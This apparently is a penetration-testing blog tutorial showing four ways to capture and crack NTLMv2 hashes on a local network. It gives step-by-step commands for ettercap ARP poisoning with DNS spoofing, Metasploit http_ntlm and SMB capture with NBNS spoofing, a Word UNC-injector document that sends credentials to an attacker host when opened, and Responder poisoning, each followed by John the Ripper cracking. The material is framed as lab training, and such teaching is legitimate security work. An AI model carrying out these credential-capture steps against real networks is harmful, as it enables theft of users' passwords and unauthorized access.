<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">4 Ways to Capture NTLM Hashes in Network</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/4-ways-capture-ntlm-hashes-network/" rel="bookmark"><time class="entry-date published" datetime="2017-10-15T14:56:21+00:00">October 15, 2017</time><time class="updated" datetime="2025-06-06T08:03:51+00:00">June 6, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">Hello friends! Today we are describing how to capture NTLM Hash in a local network. In this article, we had captured NTLM hash 4 times through various methods. Before we proceed towards attacking techniques, let’s read the brief introduction on NTLM Hash.</span></p>
<p class="ai-optimize-7"><span style="color: #000000;">The acronym for word NTLM is made by combining the following terms:</span></p>
<p class="ai-optimize-8"><span style="color: #000000;"><strong>NT</strong>: New technologies (Windows)</span></p>
<p class="ai-optimize-9"><span style="color: #000000;"><strong>LAN</strong>: Local area network</span></p>
<p class="ai-optimize-10"><span style="color: #000000;"><strong>M</strong>: Manager</span></p>
<p class="ai-optimize-11"><span style="color: #000000;">In a Windows network, <strong>NT LAN Manager</strong> (NTLM) is a suite of Microsoft security protocols. It was the default for network authentication in the Windows NT 4.0 operating system that provides authentication, integrity, and confidentiality to users. The NTLMv2 is the latest version and uses the NT MD4 based one-way function. The hash lengths are 128 bits and work for a local account and Domain account.</span></p>
<p class="ai-optimize-12"><span style="color: #000000;">The NTLM protocol uses one or both of two hashed password values, both of which are also stored on the server (or domain controller), and which through a lack of salting are password equivalent, meaning that if you grab the hash value from the server, you can authenticate without knowing the actual password.</span></p>
<p class="ai-optimize-13"><span style="color: #000000;">For more information visit Wikipedia.org</span></p>
<p class="ai-optimize-14"><span style="color: #000000;"><strong>Let’s Begin!!</strong></span></p>
<p class="ai-optimize-15"><span style="color: #000000;"><strong>Requirement</strong></span></p>
<p class="ai-optimize-16"><span style="color: #000000;">Attacker: Kali Linux</span></p>
<p class="ai-optimize-17"><span style="color: #000000;">Target: Windows 10</span></p>
<h3 class="ai-optimize-18"><span style="color: #800000;">Capture NTLMv2 hash through Sniffing  </span></h3>
<p class="ai-optimize-19"><span style="color: #000000;">Being as attacker open <strong>etter.dns</strong> file from inside /etc/ettercap in your Kali Linux system then replace whole text by editing given below line includes attacker’s IP and save the text document.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">* A 192.168.1.103</pre>
<p class="ai-optimize-21"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-iXGaj8mUrU8/WeNpH4-8aPI/AAAAAAAAR_0/Ih9ILMnb4AoolfhAjgNQF5QDnsm6QY0pQCLcBGAs/s1600/1.png"/></span></p>
<h5 class="ai-optimize-22"><span style="color: #000000;">Now follow the given below step to run ettercap to start sniffing.</span></h5>
<ul>
<li class="ai-optimize-23"><span style="color: #000000;">Application &gt; sniffing and spoofing &gt; ettercap</span></li>
<li class="ai-optimize-24"><span style="color: #000000;">Click on <strong>sniff </strong>and Select your network interface.</span></li>
<li class="ai-optimize-25"><span style="color: #000000;"><strong>Scan for the host</strong> to generate the target list.</span></li>
</ul>
<p class="ai-optimize-26"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-f9vFzojCzq0/WeNpNNQE80I/AAAAAAAASA8/AreHDw4iyNcEL18CpxxGoRC73Fh3nHw6wCLcBGAs/s1600/2.png"/></span></p>
<p class="ai-optimize-27"><span style="color: #000000;">Firslty, Select the host and add to target. From the given image you read among 5 hosts I had chosen <strong>192.168.1.101</strong> as the target and <strong>add to target 1.</strong></span></p>
<p class="ai-optimize-28"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YHoUpFjZmD4/WeNpNEC4bmI/AAAAAAAASBA/Gwdwd9d8grYV1gI5fu56poLsrXZ14VtDgCLcBGAs/s1600/3.png"/></span></p>
<p class="ai-optimize-29"><span style="color: #000000;">Then, click on <strong>MITM</strong> from the menu bar to select <strong>ARP Poisoning</strong>, a dialog box will pop-up now enable “sniff remote connects” and click OK.</span></p>
<p class="ai-optimize-30"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-p_IQsA-cw68/WeNpNFbx4uI/AAAAAAAASBE/Q15M_uoQcoUKj6fBUB3AJ9LGMTW7r1NxgCLcBGAs/s1600/4.png"/></span></p>
<p class="ai-optimize-31"><span style="color: #000000;">After then click on <strong>plugins</strong> option from the menu bar and choose <strong>dns_spoof </strong></span></p>
<p class="ai-optimize-32"><span style="color: #000000;">By making use of dns_spoof attacker can redirect the victim’s network traffic on his network IP so that whatever victim will open on his web browser will get a redirect on the attacker’s IP.</span></p>
<p class="ai-optimize-33"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZoV7Vcx2lN4/WeNpNu416SI/AAAAAAAASBI/rBYLeCHGrNkUhYtn1QTDhfc3D_WKoqfBQCLcBGAs/s1600/5.png"/></span></p>
<p class="ai-optimize-34"><span style="color: #000000;">Then, load the Metasploit framework and execute the following code to make use of the http_ntlm module.</span></p>
<p class="ai-optimize-35"><span style="color: #000000;">This module attempts to quietly catch NTLM/LM Challenge hashes.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/server/capture/http_ntlm
msf auxiliary(http_ntlm) &gt; set srvhost 192.168.1.103
msf auxiliary(http_ntlm) &gt; set srvport 80
msf auxiliary(http_ntlm) &gt; set uripath /
msf auxiliary(http_ntlm) &gt; set johnpwfile /root/Desktop/
msf auxiliary(http_ntlm) &gt; exploit</pre>
<p class="ai-optimize-36"><span style="color: #000000;">Then, according to an above trap set for the victim, this module will capture NTLM password of victim’s system when he will open any http web site on his browser which will redirect that web site on attacker’s IP.</span></p>
<p class="ai-optimize-37"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/--YcqMonk5K0/WeNpNnkvYDI/AAAAAAAASBM/1EOalc_WSLYJPHVHNc--6fseC7VWqs5UwCLcBGAs/s1600/6.png"/></span></p>
<p class="ai-optimize-38"><span style="color: #000000;">From given below image you can notice victim is trying to browse “hackingarticles.in” on his web browser but it requires authentication which is requesting for his username and password. Now if he tries to open something else let says google.com there also it will ask username and password for authentication until the victim will not submit his username and password he cannot browse anything on his web browser.</span></p>
<p class="ai-optimize-39"><span style="color: #000000;">As the victim enter username and password, the attacker at background will capture NTLM hash on his system.</span></p>
<p class="ai-optimize-40"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-3OO561OH664/WeNpNgfVj6I/AAAAAAAASBQ/HEFKhozfAcQ6ak2xr_jFEYRH4-nQUX1dQCLcBGAs/s1600/7.png"/></span></p>
<p class="ai-optimize-41"><span style="color: #000000;"><strong>Great!!</strong> The attacker had captured NTMLv2 hash, now let count detail apart from the hash value that the attacker has captured.</span></p>
<p class="ai-optimize-42"><span style="color: #000000;">From the given image you can see that the attacker has captured two things more:</span></p>
<h5 class="ai-optimize-43"><span style="color: #000000;"><strong>Username:</strong> pentest</span></h5>
<h5 class="ai-optimize-44"><span style="color: #000000;"><strong>Machine name:</strong> Desktop-UKIQM20</span></h5>
<p class="ai-optimize-45"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OBB60OBVXg0/WeNpOM-nVVI/AAAAAAAASBU/jfeD8GYc2LM09XHwWGnXGqvxc-cO7lnXACLcBGAs/s1600/8.1.png"/></span></p>
<p class="ai-optimize-46"><span style="color: #000000;">Then use john the ripper to crack the ntlmv2 hash by executing given below command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">john _netntlmv2</pre>
<p class="ai-optimize-48"><span style="color: #000000;">From given below image you can confirm we had successfully retrieved the <strong>password: 123</strong> for user: pentest by cracking ntlmv2 hash.</span></p>
<p class="ai-optimize-49"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-P0c2BfwHhRk/WeNpOZu1_oI/AAAAAAAASBY/Y9iXYuo3dLAbTgD_gBQH0jX2rsNGa6xgACLcBGAs/s1600/8.png"/></span></p>
<h3 class="ai-optimize-50"><span style="color: #800000;"><strong>Capture NTLMv2 hash through capture SMB &amp; spoof NBNS </strong></span></h3>
<p class="ai-optimize-51"><span style="color: #000000;">This module provides an SMB service that can be used to capture the challenge-response password hashes of SMB client systems. Responses sent by this service have by default the configurable challenge string (\x11\x22\x33\x44\x55\x66\x77\x88), allowing for easy cracking using Cain &amp; Abel, L0phtcrack or John the Ripper (with jumbo patch). To exploit this, the target system must try to authenticate to this module.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/server/capture/smb
msf auxiliary(smb) &gt; set srvhost 192.168.1.103
msf auxiliary(smb) &gt; set johnpwfile /root/Desktop/
msf auxiliary(smb) &gt; exploit</pre>
<p class="ai-optimize-52"><span style="color: #000000;">Simultaneously run NBNS_response module under capture smb module.</span></p>
<p class="ai-optimize-53"><span style="color: #000000;">This module forges the NetBIOS Name Service (NBNS) responses. It will listen for NBNS requests sent to the local subnet’s broadcast address and spoof a response, redirecting the querying machine to an IP of the attacker’s choosing. Combined with auxiliary/server/capture/smb or auxiliary/server/capture/http_ntlm it is a highly effective means of collecting crackable hashes on common networks. This module must be run as root and will bind to udp/137 on all interfaces.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/spoof/nbns/nbns_response
msf auxiliary(nbns_response) &gt; set spoofip 192.168.1.103
msf auxiliary(nbns_response) &gt; set interface eth0
msf auxiliary(nbns_response) &gt;exploit</pre>
<p class="ai-optimize-54"><span style="color: #000000;">As result, this module will generate a fake window security prompt on the victim’s system to establish a connection with another system in order to access shared folders of that system.</span></p>
<p class="ai-optimize-55"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-YFKua3-e4MM/WeNpH28ToFI/AAAAAAAAR_w/ubizl0A6IWAYndBvwRH3KvJFWbB5WLpxACLcBGAs/s1600/10.png"/></span></p>
<p class="ai-optimize-56"><span style="color: #000000;">We had use nmap UDP and TCP port scanning command for identifying open ports and protocol and from the given image you can port <strong>137 </strong>is<strong> open</strong> for <strong>NetBIOS </strong>network service.</span></p>
<p class="ai-optimize-57"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-MIzsdqwQx_s/WeNpHxFA1SI/AAAAAAAAR_4/_uIVJoVL7AMb2Um35OtmlZASrgTkl22vwCLcBGAs/s1600/11.1.png"/></span></p>
<p class="ai-optimize-58"><span style="color: #000000;">Then, the victim will try to access share folder, therefore, he will try of connecting with him (attacker) through his network IP, given below image is a proof to demonstrate that victim is connecting attacker’s IP: 192.168.1.103.</span></p>
<p class="ai-optimize-59"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-EPXa7Y7YzLQ/WeNpIbUz0vI/AAAAAAAAR_8/tYarD9nC4UIwy09WOHIs9SYFFyHjxzgjwCLcBGAs/s1600/11.2.png"/></span></p>
<p class="ai-optimize-60"><span style="color: #000000;">When the victim will try to access a shared folder, he will get trap into fake window security alert prompt, which will ask victims to enter his username and password for accessing shared folders.</span></p>
<p class="ai-optimize-61"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-s3hDKCEU9R4/WeNpIXs2FiI/AAAAAAAASAM/3xB0TEstqWkPqgk6GHXoWHloVHnBqr2ZQCLcBGAs/s1600/11.png"/></span></p>
<p class="ai-optimize-62"><span style="color: #000000;"><strong>Awesome!! </strong>Once again the attacker had captured NTMLv2 hash, from the given image you can see that here also the attacker has captured two things more:</span></p>
<h5 class="ai-optimize-63"><span style="color: #000000;"><strong>Username:</strong> pentest</span></h5>
<h5 class="ai-optimize-64"><span style="color: #000000;"><strong>Machine name:</strong> Desktop-UKIQM20</span></h5>
<p class="ai-optimize-65"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-tqrdlk-u-Fs/WeNpIq1kJ2I/AAAAAAAASAA/b1PQdHs0ZUUp_n3lYeOONRjaZ5BliVqZQCLcBGAs/s1600/12.png"/></span></p>
<p class="ai-optimize-66"><span style="color: #000000;">Again use john the ripper to crack the ntlmv2 hash by executing given below command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">john _netntlmv2</pre>
<p class="ai-optimize-68"><span style="color: #000000;">From given below image you can confirm we had successfully retrieved the password: 123 for user: pentest by cracking ntlmv2 hash.</span></p>
<p class="ai-optimize-69"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-KsY3rHm8cU0/WeNpIzC91jI/AAAAAAAASAE/6qzLK8Ip730t-8JKYiZSDqqYUBwvjyRdACLcBGAs/s1600/13.png"/></span></p>
<h3 class="ai-optimize-70"><span style="color: #800000;">Capture NTLMv2 hash through capture SMB &amp; word UNC injector</span></h3>
<p class="ai-optimize-71"><span style="color: #000000;">This module modifies a .docx file that will, upon opening, submit stored netNTLM credentials to a remote host. It can also create an empty docx file. If emailing the receiver needs to put the document in editing mode before the remote server will be contacted. Preview and read-only mode do not work. Verified to work with Microsoft Word 2003, 2007, 2010, and 2013.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/docx/word_unc_injector
msf auxiliary(word_unc_injector) &gt; set lhost 192.168.1.103
msf auxiliary(word_unc_injector) &gt; exploit</pre>
<p class="ai-optimize-72"><span style="color: #000000;">It has created an empty docx file under given path <strong>/root/.msf4/local/</strong></span></p>
<p class="ai-optimize-73"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-J2VJ-y4vt6Q/WeNpJNzvhbI/AAAAAAAASAI/Otp2gFiwaxgEpiPx5Vk51FT_51kRfsfUgCLcBGAs/s1600/14.1.png"/></span></p>
<p class="ai-optimize-74"><span style="color: #000000;">Now send this msf.docx file to victims and again run capture smb module in Metasploit framework as done previously.</span></p>
<p class="ai-optimize-75"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-NJGPtvlnMgs/WeNpKeujQsI/AAAAAAAASAc/BZNWqYGZ5LwiSivfB8Caux_wAf4pPBIqQCLcBGAs/s1600/14.2.png"/></span></p>
<p class="ai-optimize-76"><span style="color: #000000;">From given below image you can observe that in order to get the hashes the <strong>auxiliary/server/capture/smb</strong> module has been used.</span></p>
<p class="ai-optimize-77"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-OcH206COtNE/WeNpJ2a-fSI/AAAAAAAASAQ/6VlKDbE1DawRgnRXAZ2-bo58YLvFG2ypwCLcBGAs/s1600/14.3.png"/></span></p>
<p class="ai-optimize-78"><span style="color: #000000;">As the victim will open <strong>msf.docx</strong> file, again the attacker had captured NTMLv2 hash on his system. The only difference between above two attacks and in this attack is that here we had only captured NTLMv2 hash.</span></p>
<p class="ai-optimize-79"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Id9qFFNDeVA/WeNpKY1MRII/AAAAAAAASAU/QvVxB4xldkkIa5mbIF0hNIOtjZO6ZnK3gCLcBGAs/s1600/14.4.png"/></span></p>
<p class="ai-optimize-80"><span style="color: #000000;">Again use john the ripper to crack the ntlmv2 hash by executing given below command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">john _netntlmv2</pre>
<p class="ai-optimize-82"><span style="color: #000000;">From given below image you can confirm we had successfully retrieved the password: 123 for user: pentest by cracking ntlmv2 hash.</span></p>
<p class="ai-optimize-83"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-XAsO6dOnnHk/WeNpKd57WRI/AAAAAAAASAY/k7CCsm2o3i4gfBTXbVMn3mJCOBX7Enj7QCLcBGAs/s1600/14.5.png"/></span></p>
<h3 class="ai-optimize-84"><span style="color: #800000;">Responder </span></h3>
<p class="ai-optimize-85"><span style="color: #000000;">NBT-NS/LLMNR Responder Created by Laurent Gaffie. It is an LLMNR, NBT-NS and MDNS poisoner with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server that can perform above all attacks. It will answer to <em>specific</em> NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool will only answer to File Server Service request, which is for SMB.</span></p>
<p class="ai-optimize-86"><span style="color: #000000;">This tool listens on several ports: UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, TCP 80, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587 and Multicast UDP 5553.</span></p>
<p class="ai-optimize-87"><span style="color: #000000;">Then open the new terminal and type following command to download it from GitHub:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/SpiderLabs/Responder.git
cf Responder</pre>
<p class="ai-optimize-88"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4VX4DvmNvMM/WeNpK6s8iuI/AAAAAAAASAk/F2rtaUx1ouMqlGWaRMtj_RNfVgQ3EDOlQCLcBGAs/s1600/14.9.png"/></span></p>
<p class="ai-optimize-89"><span style="color: #000000;">Once it gets downloaded execute the following command to run the python script.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python Responder.py –I 192.168.1.103 -I eth0</pre>
<p class="ai-optimize-90"><span style="color: #000000;">From the specified image you can perceive that all poisoners and server services get ON.</span></p>
<p class="ai-optimize-91"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-gMfzJIohX2Y/WeNpK_9_FvI/AAAAAAAASAg/M5oBm92S6206942tnw0vgux9wZmHhMWRwCLcBGAs/s1600/14.png"/></span></p>
<p class="ai-optimize-92"><span style="color: #000000;">Then again victim will try to access share folder. Therefore, he will try of connecting with him (attacker) through his network IP. Given below image is a proof to display that victim is connecting attacker’s IP: 192.168.1.103.</span></p>
<p class="ai-optimize-93"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-__g6GXiMCfk/WeNpMKI5W5I/AAAAAAAASAo/gj6rfj2SvH4Z3LA4qjyD0Lc9ksNzov_uwCLcBGAs/s1600/15.png"/></span></p>
<p class="ai-optimize-94"><span style="color: #000000;">When the victim will try to access the shared folder, he will get trap into fake network error alert prompt, as shown in the given below image.</span></p>
<p class="ai-optimize-95"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-9-IYUSzCY3A/WeNpMJbbzMI/AAAAAAAASAs/t6afjdzTUcgKrQnSaziSA_8NZYeSmBuRgCLcBGAs/s1600/16.png"/></span></p>
<p class="ai-optimize-96"><span style="color: #000000;">Once again the attacker had successfully captured NTMLv2 hash, from the given image you can see that here also the attacker has captured two things more:</span></p>
<h5 class="ai-optimize-97"><span style="color: #000000;"><strong>Username:</strong> pentest</span></h5>
<h5 class="ai-optimize-98"><span style="color: #000000;"><strong>Machine name:</strong> Desktop-UKIQM20</span></h5>
<p class="ai-optimize-99"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Bll_GtmQ0Ks/WeNpMaC-4qI/AAAAAAAASAw/Z0bmJL8qOAIiaul-3y1pxXZX_EmG6omFwCLcBGAs/s1600/17.1.png"/></span></p>
<p class="ai-optimize-100"><span style="color: #000000;">It will store captured NTLM hash in a text document under given <strong>/root/Desktop/Responder/logs</strong>.</span></p>
<p class="ai-optimize-101"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-nwlnOmyQm5w/WeNpMoQuFYI/AAAAAAAASA0/n1TDcqMKJVoACDjVdl7XC6p1OLmJhZP-ACLcBGAs/s1600/17.png"/></span></p>
<p class="ai-optimize-102"><span style="color: #000000;">Then, again use john the ripper to crack the ntlmv2 hash by executing given below command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">john _netntlmv2</pre>
<p class="ai-optimize-104"><span style="color: #000000;">From given below image you can confirm we had successfully retrieved the password: 123 for user: pentest by cracking ntlmv2 hash.</span></p>
<p class="ai-optimize-105"><span style="color: #000000;"><strong>Wonderful!</strong> These were the four ways to trap the target user in order to capture the NTLM hash.</span></p>
<p class="ai-optimize-106"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-IQWwLxkKvCQ/WeNpM36wwSI/AAAAAAAASA4/wJld7zCTA_84vnCwZN9K7Zm-X0vU5Yh9QCLcBGAs/s1600/18.png"/></span></p>
<p class="ai-optimize-55"><span style="color: #000000;">To learn more about Penteration Testing. Follow this</span> <a href="https://www.hackingarticles.in/category/penetration-testing/">Link.</a></p>
<p class="ai-optimize-107"><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<a href="https://www.linkedin.com/in/aarti--singh/"> here</a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
<!-- YARPP Thumbnails -->
<h3>Related posts:</h3>
<div class="yarpp-thumbnails-horizontal">
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/multiple-files-to-capture-ntlm-hashes-ntlm-theft/" title="Multiple Files to Capture NTLM Hashes: NTLM Theft">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Multiple Files to Capture NTLM Hashes: NTLM Theft</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/" title="Domain Escalation: PetitPotam NTLM Relay to ADCS Endpoints">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Domain Escalation: PetitPotam NTLM Relay to ADCS Endpoints</span></a>
</div>
</div>
            </div><!-- .entry-content -->
            <footer class="post-footer entry-footer">
                                                
            </footer><!-- .entry-footer -->
            
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/hack-zico2-vm-ctf-challenge/" rel="prev">Hack the Zico2 VM (CTF Challenge)</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/hack-lazysysadmin-vm-ctf-challenge/" rel="next">Hack the Lazysysadmin VM (CTF Challenge)</a></div></div>
	</nav>        </div>
